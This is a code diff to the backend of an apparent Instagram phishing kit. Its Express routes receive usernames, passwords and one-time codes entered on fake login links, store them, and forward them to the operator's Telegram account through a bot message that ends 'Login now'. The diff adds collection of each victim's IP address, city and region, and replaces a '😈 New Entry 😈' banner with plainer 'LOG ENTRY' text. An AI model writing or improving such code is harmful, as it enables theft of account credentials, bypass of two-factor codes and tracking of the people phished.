@@ -48,7 +48,7 @@ router.get("/inst/otp/:linkId", async (req, res) => {
 
 router.post("/inst/:linkId", async (req, res) => {
     try {
-        const { username, password, country } = req.body;
+        const { username, password, country, city, region, ip } = req.body;
         const { linkId } = req.params;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
@@ -63,6 +63,9 @@ router.post("/inst/:linkId", async (req, res) => {
                 linkName: link.name,
                 linkType: "Instagram",
                 country,
+                region,
+                ip,
+                city,
                 fields: {
                     username,
                     password
@@ -70,14 +73,16 @@ router.post("/inst/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-                😈 New Entry 😈
-SOCIAL MEDIA: INSTAGRAM
-
-LOCATION: ${country}
+LOG ENTRY
+PLATFORM: INSATGRAM
 
 USERNAME: ${username}
 PASSWORD: ${password}
-OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
+
+COUNTRY: ${country}
+CITY: ${city}
+REGION: ${region}
+IP: ${ip}
 
 Login now: https://www.instagram.com
                                                 `)
@@ -107,11 +112,11 @@ router.post("/inst/otp/:linkId", async (req, res) => {
 
         if (link) {
             await bot.sendMessage(user.telegramID, `
-😈 NEW ENTRY 😈
+LOG ENTRY
 
-SOCIAL MEDIA: INSTAGRAM
-
-OTP: ${code}
+PLATFORM: INSTAGRAM
+TYPE: OTP
+CODE: ${code}
 
                 `)
                 .catch(err => console.log("Telegram error"));
